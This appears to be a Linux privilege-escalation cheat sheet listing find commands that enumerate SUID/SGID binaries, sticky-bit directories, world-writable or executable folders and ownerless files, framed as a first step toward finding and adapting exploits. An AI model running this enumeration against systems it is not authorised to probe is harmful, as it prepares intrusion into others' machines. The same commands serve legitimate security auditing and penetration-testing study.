Enumeration is the key.
(Linux) privilege escalation is all about:
Collect - Enumeration, more enumeration and some more enumeration.
Process - Sort through data, analyse and prioritisation.
Search - Know what to search for and where to find the exploit code.
Adapt - Customize the exploit, so it fits. Not every exploit work for every system "out of the box".
Try - Get ready for (lots of) trial and error.

What "Advanced Linux File Permissions" are used? Sticky bits, SUID & GUID
find / -perm -1000 -type d 2>/dev/null    # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the  group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the  owner, not the user who started it.

find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)

# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null 


Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm
find / -writable -type d 2>/dev/null        # world-writeable folders
find / -perm -222 -type d 2>/dev/null      # world-writeable folders
find / -perm -o+w -type d 2>/dev/null    # world-writeable folders

find / -perm -o+x -type d 2>/dev/null    # world-executable folders

find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null   # world-writeable & executable folders


Any "problem" files? Word-writeable, "nobody" files
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
